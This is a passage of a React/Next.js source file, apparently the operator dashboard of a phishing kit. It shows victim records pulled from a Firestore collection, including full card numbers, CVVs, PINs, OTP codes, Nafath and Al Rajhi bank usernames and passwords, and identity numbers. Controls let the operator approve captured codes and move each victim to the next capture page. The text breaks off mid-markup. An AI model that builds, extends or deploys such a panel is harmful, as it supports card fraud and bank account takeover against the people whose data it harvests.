"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  Car,
  FileText,
  CheckCircle,
  XCircle,
  AlertCircle,
  Clock,
  Calendar,
  Search,
  Shield,
  CreditCardIcon as CardIcon,
  Filter,
  MoreHorizontal,
  Tag,
  Bell,
  Eye,
  Loader2,
  RefreshCw,
  Smartphone,
  LayoutDashboard,
  ArrowUpDown,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { format } from "date-fns"
import { Toaster, toast } from "sonner"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { auth, db } from "@/lib/firebase"
import { Skeleton } from "@/components/ui/skeleton"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { playNotificationSound } from "@/lib/actions"

interface PaymentData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  card_holder_name?:string
  buyer_identity_number?: string
  card_number?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode: string
  phoneVerificationStatus: string
}

export default function   NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [showSidebar, setShowSidebar] = useState(false)
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")

  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        [attachmentType]: value,
      })

      // Play notification sound
      playNotificationSound()

      toast.success("تم تحديث المرفق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating attachment:", error)
      toast.error("حدث خطأ أثناء تحديث المرفق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (searchTerm.trim() === "" && !activeFilter) {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        const matchesSearch =
          searchTerm.trim() === "" ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.card_number?.includes(searchTerm)

        const matchesFilter =
          !activeFilter ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected") ||
          (activeFilter === "payment" && notification.pagename === "payment") ||
          (activeFilter === "registration" && notification.vehicle_type === "registration")

        return matchesSearch && matchesFilter
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications, activeFilter])

  useEffect(() => {
    // Extract unique pagenames from notifications
    if (notifications.length > 0) {
      const pagenames = notifications
        .map((notification) => notification.pagename)
        .filter((pagename): pagename is string => !!pagename)

      const uniqueNames = Array.from(new Set(pagenames))
      setUniquePagenames(uniqueNames)
    }
  }, [notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      playNotificationSound()

      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    }, 1000)
    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      toast.success("تم مسح جميع البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      const updatedNotifications = notifications.filter((notification) => notification.id !== id)
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )
      toast.success("تم حذف البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handlePhoneOtpApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        phoneVerificationStatus: state,
        otpStatus: state,
      })

      toast.success("تم تحديث حالة التحقق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating phone OTP status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة التحقق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handlePassApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        cardOtpStatus: state,
        otpStatus: state,
      })

      toast.success("تم تحديث حالة البطاقة بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating card status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة البطاقة", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
        paymentStatus: state,
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, status: state } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      if (state === "approved") {
        toast.success("تم قبول الطلب بنجاح", {
          position: "top-center",
          duration: 3000,
          icon: <CheckCircle className="h-5 w-5" />,
        })
      } else {
        toast.error("تم رفض الطلب", {
          position: "top-center",
          duration: 3000,
          icon: <XCircle className="h-5 w-5" />,
        })
      }

      closeDialog()
    } catch (error) {
      console.error("Error updating status:", error)
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleUpdatePagename = async (id: string, newPagename: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        pagename: newPagename,
        isFromDash:true
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, pagename: newPagename } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      toast.success("تم تحديث نوع الطلب بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error updating pagename:", error)
      toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "vehicle") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedCardInfo(notification)
    setShowCardDialog(true)
  }

  const handlePagenameBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedNotification(notification)
    setShowPagenameDialog(true)
  }

  const handleViewDetails = (notification: Notification) => {
    setSelectedNotification(notification)
    setShowSidebar(true)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const getStatusBadge = (paymentStatus?: string) => {
    if (!paymentStatus || paymentStatus === "pending") {
      return (
        <div className="flex items-center gap-1.5">
          <Clock className="h-3.5 w-3.5 text-amber-500" />
          <span className="text-amber-600 font-medium">قيد الانتظار</span>
        </div>
      )
    } else if (paymentStatus === "approved") {
      return (
        <div className="flex items-center gap-1.5">
          <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
          <span className="text-emerald-600 font-medium">مقبول</span>
        </div>
      )
    } else {
      return (
        <div className="flex items-center gap-1.5">
          <XCircle className="h-3.5 w-3.5 text-rose-500" />
          <span className="text-rose-600 font-medium">مرفوض</span>
        </div>
      )
    }
  }

  const getPageType = (pagename?: string, clickable = false, notification?: Notification) => {
    let badge

    switch (pagename) {
      case "payment":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700" : ""
            }`}
          >
            <CreditCard className="h-3 w-3 mr-1" /> دفع
          </Badge>
        )
        break
      case "home":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-violet-500 to-violet-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-violet-600 hover:to-violet-700" : ""
            }`}
          >
            <FileText className="h-3 w-3 mr-1" /> تسجيل
          </Badge>
        )
        break
      case "verify-otp":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-pink-500 to-pink-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-pink-600 hover:to-pink-700" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1" /> رمز OTP
          </Badge>
        )
        break
      case "verify-phone":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-rose-500 to-rose-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-rose-600 hover:to-rose-700" : ""
            }`}
          >
            <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
          </Badge>
        )
        break
      case "external-link":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1" /> راجحي
          </Badge>
        )
        break
      case "nafaz":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-teal-600 hover:to-teal-700" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1" /> نفاذ
          </Badge>
        )
        break
      case "":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
            }`}
          >
            <Calendar className="h-3 w-3 mr-1" /> الرئيسية
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-slate-500 to-slate-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-slate-600 hover:to-slate-700" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
          </Badge>
        )
    }

    if (clickable && notification) {
      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
    }

    return badge
  }

  const formatCardNumber = (cardNumber?: string) => {
    if (!cardNumber) return "غير محدد"
    // Format as **** **** **** 1234
    const last4 = cardNumber.slice(-4)
    return `**** **** **** ${last4}`
  }

  const applyFilter = (filter: string | null) => {
    setActiveFilter(filter)
  }

  const handleSortChange = (value: string) => {
    setSortOrder(value as "newest" | "oldest")

    // Sort the filtered notifications
    const sorted = [...filteredNotifications].sort((a, b) => {
      const dateA = new Date(a.createdDate).getTime()
      const dateB = new Date(b.createdDate).getTime()
      return value === "newest" ? dateB - dateA : dateA - dateB
    })

    setFilteredNotifications(sorted)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 text-foreground p-8">
        <Card className="shadow-xl border-0 overflow-hidden">
          <CardHeader className="bg-white dark:bg-slate-800 pb-2 border-b">
            <div className="flex justify-between items-center">
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
                لوحة البيانات
              </CardTitle>
              <Skeleton className="h-9 w-32 rounded-md" />
            </div>
            <div>
            </div>
          </CardHeader>
          <CardContent className="p-6 bg-white dark:bg-slate-800">
            <div className="space-y-6">
              <div className="flex justify-between">
                <Skeleton className="h-10 w-64 rounded-md" />
                <Skeleton className="h-10 w-32 rounded-md" />
              </div>
              <div className="space-y-4">
                {[1, 2, 3, 4].map((i) => (
                  <div
                    key={i}
                    className="flex items-center justify-between p-4 border border-slate-100 dark:border-slate-700 rounded-lg"
                  >
                    <div className="flex items-center gap-4">
                      <Skeleton className="h-10 w-10 rounded-full" />
                      <div className="space-y-2">
                        <Skeleton className="h-4 w-40" />
                        <Skeleton className="h-3 w-24" />
                      </div>
                    </div>
                    <Skeleton className="h-8 w-24 rounded-md" />
                  </div>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 text-foreground"
    >
      <Toaster richColors closeButton position="top-center" />

      {/* Header */}
      <header className="sticky top-0 z-10 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 shadow-sm">
        <div className="container mx-auto px-4 py-3 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-gradient-to-r from-slate-700 to-slate-800 dark:from-slate-600 dark:to-slate-700 p-2 rounded-lg shadow-md">
              <LayoutDashboard className="h-5 w-5 text-white" />
            </div>
            <h1 className="text-xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
              لوحة البيانات
            </h1>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    onClick={handleLogout}
                    size="sm"
                    className="gap-1 border border-slate-200 dark:border-slate-700 shadow-sm"
                  >
                    <LogOut className="h-4 w-4" />
                    <span className="hidden sm:inline">تسجيل الخروج</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تسجيل الخروج من النظام</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    onClick={refreshData}
                    size="sm"
                    className="gap-1 border border-slate-200 dark:border-slate-700 shadow-sm"
                    disabled={isRefreshing}
                  >
                    {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                    <span className="hidden sm:inline">تحديث</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6">
        <Card className="shadow-lg border-0 overflow-hidden">
          <CardHeader className="bg-white dark:bg-slate-800 pb-4 border-b">
            <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
                البيانات والإشعارات
              </CardTitle>
              <div className="flex flex-wrap sm:flex-nowrap gap-2">
                <Button
                  variant="destructive"
                  onClick={handleClearAll}
                  className="gap-2 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 border-0 shadow-md"
                  disabled={notifications.length === 0}
                >
                  <Trash2 className="h-4 w-4" />
                  مسح الكل
                </Button>
              </div>
            </div>
          </CardHeader>

          <div className="p-4 bg-white dark:bg-slate-800 border-b">
            <div className="flex flex-col md:flex-row gap-4 justify-between">
              <div className="flex flex-col sm:flex-row gap-3 w-full">
                <div className="relative w-full md:w-96">
                  <Search className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                  <Input
                    placeholder="بحث بالاسم أو رقم الهاتف أو رقم البطاقة..."
                    className="pr-10 w-full"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                  />
                </div>
                <Select value={sortOrder} onValueChange={handleSortChange}>
                  <SelectTrigger className="w-full sm:w-[180px]">
                    <SelectValue placeholder="ترتيب حسب" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="newest">الأحدث أولاً</SelectItem>
                    <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="w-full overflow-auto mt-4">
              <div className="flex gap-2 pb-2">
                <Button
                  variant={activeFilter === null ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter(null)}
                  className={
                    activeFilter === null
                      ? "bg-slate-800 text-white hover:bg-slate-900 dark:bg-slate-700 dark:hover:bg-slate-800"
                      : ""
                  }
                >
                  الكل
                </Button>
                <Button
                  variant={activeFilter === "pending" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("pending")}
                  className={activeFilter === "pending" ? "bg-amber-500 text-white hover:bg-amber-600" : ""}
                >
                  <Clock className="h-3.5 w-3.5 ml-1" />
                  قيد الانتظار
                </Button>
                <Button
                  variant={activeFilter === "approved" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("approved")}
                  className={activeFilter === "approved" ? "bg-emerald-500 text-white hover:bg-emerald-600" : ""}
                >
                  <CheckCircle className="h-3.5 w-3.5 ml-1" />
                  مقبول
                </Button>
                <Button
                  variant={activeFilter === "rejected" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("rejected")}
                  className={activeFilter === "rejected" ? "bg-rose-500 text-white hover:bg-rose-600" : ""}
                >
                  <XCircle className="h-3.5 w-3.5 ml-1" />
                  مرفوض
                </Button>
                <Button
                  variant={activeFilter === "payment" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("payment")}
                  className={activeFilter === "payment" ? "bg-cyan-500 text-white hover:bg-cyan-600" : ""}
                >
                  <CreditCard className="h-3.5 w-3.5 ml-1" />
                  دفع
                </Button>
                <Button
                  variant={activeFilter === "registration" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("registration")}
                  className={activeFilter === "registration" ? "bg-violet-500 text-white hover:bg-violet-600" : ""}
                >
                  <Car className="h-3.5 w-3.5 ml-1" />
                  تسجيل
                </Button>
              </div>
            </div>
          </div>

          <CardContent className="p-0 bg-white dark:bg-slate-800">
            {filteredNotifications.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-16">
                <div className="w-24 h-24 rounded-full bg-slate-100 dark:bg-slate-700 flex items-center justify-center mb-4">
                  <AlertCircle className="h-12 w-12 text-muted-foreground" />
                </div>
                <h3 className="text-xl font-medium mb-2">لا توجد بيانات</h3>
                <p className="text-muted-foreground max-w-md text-center">
                  {searchTerm || activeFilter
                    ? "لا توجد نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث أو الفلتر."
                    : "ستظهر البيانات الجديدة هنا عند وصولها"}
                </p>
                {(searchTerm || activeFilter) && (
                  <Button
                    variant="outline"
                    className="mt-4"
                    onClick={() => {
                      setSearchTerm("")
                      setActiveFilter(null)
                    }}
                  >
                    إعادة ضبط البحث
                  </Button>
                )}
              </div>
            ) : (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="bg-slate-50 hover:bg-slate-50 dark:bg-slate-800/50 dark:hover:bg-slate-800/50">
                      <TableHead className="text-right font-bold">
                        <div className="flex items-center gap-1">
                          الصفحة الحالية
                          <ArrowUpDown className="h-3 w-3 text-muted-foreground" />
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold">
                        <div className="flex items-center gap-1">
                          الاسم
                          <ArrowUpDown className="h-3 w-3 text-muted-foreground" />
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold">رقم البطاقة</TableHead>
                      <TableHead className="text-right font-bold">اجراء مطلوب</TableHead>
                      <TableHead className="text-right font-bold">الحالة</TableHead>
                      <TableHead className="text-right font-bold">
                        <div className="flex items-center gap-1">
                          التاريخ
                          <ArrowUpDown className="h-3 w-3 text-muted-foreground" />
                        </div>
                      </TableHead>
                      <TableHead className="text-center font-bold">إجراءات</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredNotifications.map((notification) => (
                      <TableRow
                        key={notification.id}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/50 border-b border-slate-100 dark:border-slate-700 relative cursor-pointer transition-colors"
                        onClick={() => handleViewDetails(notification)}
                      >
                        <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
                        <TableCell className="font-medium">
                          <div className="flex items-center gap-2">
                            <div className="w-8 h-8 rounded-full bg-slate-100 dark:bg-slate-700 flex items-center justify-center">
                              <User className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                            </div>
                            <Badge
                              variant="outline"
                              className="bg-gradient-to-r from-slate-100 to-slate-200 hover:from-slate-200 hover:to-slate-300 text-slate-800 dark:from-slate-700 dark:to-slate-600 dark:text-slate-200 dark:hover:from-slate-600 dark:hover:to-slate-500 border-0 shadow-sm cursor-pointer"
                              onClick={(e) => {
                                e.stopPropagation()
                                handleInfoClick(notification, "personal")
                              }}
                            >
                              {notification.documment_owner_full_name ||
                                notification.document_owner_full_name ||
                                "غير محدد"}
                            </Badge>
                          </div>
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant="outline"
                            className={`cursor-pointer ${
                              notification.card_number
                                ? notification.pinCode
                                  ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-900/30 dark:text-emerald-300 dark:border-emerald-800"
                                  : notification.otpCode
                                    ? "animate-ping animate-bounce bg-cyan-50 text-cyan-700 border-cyan-200 dark:bg-cyan-900/30 dark:text-cyan-300 dark:border-cyan-800"
                                    : "bg-amber-500 text-white border-amber-400 dark:bg-amber-900/30 dark:text-amber-300 dark:border-amber-800"
                                : "bg-gradient-to-r from-rose-400 to-rose-600 text-white dark:from-rose-600 dark:to-rose-800"
                            } hover:bg-opacity-80 transition-colors`}
                            onClick={(e) => handleCardBadgeClick(notification, e)}
                          >
                            <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />

                            {notification.card_number ? "بيانات البطاقة" : "لا يوجد بطاقة"}


                                             </Badge>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-1.5 flex-wrap">
                            {notification?.nafadUsername && (
                              <Badge
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setShowNafazDialog(true)
                                }}
                                className="bg-teal-500 hover:bg-teal-600 cursor-pointer"
                              >
                                نفاذ
                              </Badge>
                            )}
                            {notification?.externalUsername && (
                              <Badge
                                variant="default"
                                className="cursor-pointer bg-emerald-500 hover:bg-emerald-600"
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setShowRajhiDialog(true)
                                }}
                              >
                                راجحي
                              </Badge>
                            )}

                            {notification.phone2 && (
                              <Badge
                                className={`cursor-pointer ${
                                  notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
                                } ${
                                  notification.otpCode
                                    ? "bg-pink-500 text-white hover:bg-pink-600"
                                    : "bg-slate-500 hover:bg-slate-600"
                                }`}
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setPhoneDialog(true)
                                }}
                                variant="outline"
                              >
                                {notification.phone2}
                              </Badge>
                            )}
                          </div>
                        </TableCell>

                        <TableCell>{getStatusBadge(notification.status)}</TableCell>
                        <TableCell>
                          <div className="flex flex-col">
                            <span className="text-sm font-medium">
                              {format(new Date(notification.createdDate), "yyyy/MM/dd")}
                            </span>
                            <span className="text-xs text-muted-foreground">
